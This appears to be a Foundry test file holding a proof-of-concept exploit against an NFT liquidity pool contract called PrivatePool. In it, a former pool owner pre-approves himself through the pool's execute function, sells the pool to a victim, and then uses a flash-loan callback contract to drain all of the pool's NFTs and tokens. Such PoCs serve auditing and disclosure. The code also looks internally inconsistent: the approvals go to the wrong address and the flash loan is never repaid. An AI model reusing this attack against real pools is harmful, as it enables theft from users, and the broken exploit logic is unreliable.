// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../../src/PrivatePool.sol";
import "../../src/Factory.sol";
import "solmate/tokens/ERC721.sol";
import "solmate/tokens/ERC20.sol";
import "openzeppelin/interfaces/IERC3156FlashBorrower.sol";

contract MockERC721 is ERC721 {
    uint256 private _tokenIdCounter;

    constructor() ERC721("MockNFT", "MNFT") {}

    function mint(address to) public returns (uint256) {
        uint256 tokenId = _tokenIdCounter++;
        _mint(to, tokenId);
        return tokenId;
    }

    function tokenURI(uint256) public pure override returns (string memory) {
        return "";
    }
}

contract MockERC20 is ERC20 {
    constructor() ERC20("MockToken", "MTK", 18) {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

contract PrivatePoolExploit is IERC3156FlashBorrower {
    PrivatePool public pool;
    address public attacker;
    MockERC721 public nft;
    MockERC20 public token;
    uint256[] public stolenTokenIds;

    constructor(address _pool, address _nft, address _token) {
        pool = PrivatePool(payable(_pool));
        attacker = msg.sender;
        nft = MockERC721(_nft);
        token = MockERC20(_token);
    }

    function attack(uint256 tokenId) external {
        pool.flashLoan(this, address(this), tokenId, "");
    }

    function onFlashLoan(
        address initiator,
        address,
        uint256,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        uint256 nftBalance = nft.balanceOf(address(pool));
        for (uint256 i = 0; i < nftBalance; i++) {
            try nft.ownerOf(i) returns (address owner) {
                if (owner == address(pool)) {
                    nft.transferFrom(address(pool), attacker, i);
                    stolenTokenIds.push(i);
                }
            } catch {}
        }

        uint256 tokenBalance = token.balanceOf(address(pool));
        if (tokenBalance > 0) {
            token.transferFrom(address(pool), attacker, tokenBalance);
        }

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function transferFrom(address from, address to, uint256 tokenId) external {
        return;
    }

    function ownerOf(uint256) external view returns (address) {
        return address(pool);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

contract ExploitTest is Test {
    Factory public factory;
    PrivatePool public privatePoolImplementation;
    PrivatePool public pool;
    MockERC721 public nft;
    MockERC20 public token;
    PrivatePoolExploit public exploit;

    address public bob = address(0xB0B);
    address public alice = address(0xA11CE);

    uint256[] public tokenIds;

    function setUp() public {
        vm.label(bob, "Bob (Attacker)");
        vm.label(alice, "Alice (Victim)");

        vm.startPrank(bob);

        factory = new Factory();
        privatePoolImplementation = new PrivatePool(address(factory), address(0), address(0));
        factory.setPrivatePoolImplementation(address(privatePoolImplementation));

        nft = new MockERC721();
        token = new MockERC20();

        for (uint256 i = 0; i < 5; i++) {
            uint256 tokenId = nft.mint(bob);
            tokenIds.push(tokenId);
        }

        token.mint(bob, 500e18);

        nft.setApprovalForAll(address(factory), true);

        bytes32 salt = keccak256(abi.encodePacked(bob, block.timestamp));
        pool = PrivatePool(
            payable(
                factory.create(
                    address(token),
                    address(nft),
                    100e18,
                    5e18,
                    0,
                    200,
                    bytes32(0),
                    false,
                    false,
                    salt,
                    tokenIds,
                    500e18
                )
            )
        );

        vm.stopPrank();
    }

    function testExploit() public {
        vm.startPrank(bob);

        bytes memory approveERC20Data = abi.encodeWithSelector(
            ERC20.approve.selector,
            bob,
            type(uint256).max
        );
        pool.execute(address(token), approveERC20Data);

        bytes memory setApprovalForAllData = abi.encodeWithSelector(
            ERC721.setApprovalForAll.selector,
            bob,
            true
        );
        pool.execute(address(nft), setApprovalForAllData);

        vm.stopPrank();

        vm.startPrank(bob);
        uint256 poolTokenId = uint160(address(pool));
        factory.safeTransferFrom(bob, alice, poolTokenId);
        vm.stopPrank();

        assertEq(factory.ownerOf(poolTokenId), alice);

        uint256 bobNFTBalanceBefore = nft.balanceOf(bob);
        uint256 bobTokenBalanceBefore = token.balanceOf(bob);
        uint256 poolNFTBalanceBefore = nft.balanceOf(address(pool));
        uint256 poolTokenBalanceBefore = token.balanceOf(address(pool));

        assertEq(poolNFTBalanceBefore, 5);
        assertEq(poolTokenBalanceBefore, 500e18);

        vm.startPrank(bob);

        exploit = new PrivatePoolExploit(address(pool), address(nft), address(token));

        exploit.attack(0);

        vm.stopPrank();

        uint256 bobNFTBalanceAfter = nft.balanceOf(bob);
        uint256 bobTokenBalanceAfter = token.balanceOf(bob);
        uint256 poolNFTBalanceAfter = nft.balanceOf(address(pool));
        uint256 poolTokenBalanceAfter = token.balanceOf(address(pool));

        assertEq(bobNFTBalanceAfter, bobNFTBalanceBefore + 5);
        assertEq(bobTokenBalanceAfter, bobTokenBalanceBefore + 500e18);
        assertEq(poolNFTBalanceAfter, 0);
        assertEq(poolTokenBalanceAfter, 0);

        console.log("=== Exploit Successful ===");
        console.log("Bob's NFT balance before:", bobNFTBalanceBefore);
        console.log("Bob's NFT balance after:", bobNFTBalanceAfter);
        console.log("Bob's Token balance before:", bobTokenBalanceBefore);
        console.log("Bob's Token balance after:", bobTokenBalanceAfter);
        console.log("Pool's NFT balance before:", poolNFTBalanceBefore);
        console.log("Pool's NFT balance after:", poolNFTBalanceAfter);
        console.log("Pool's Token balance before:", poolTokenBalanceBefore);
        console.log("Pool's Token balance after:", poolTokenBalanceAfter);
    }
}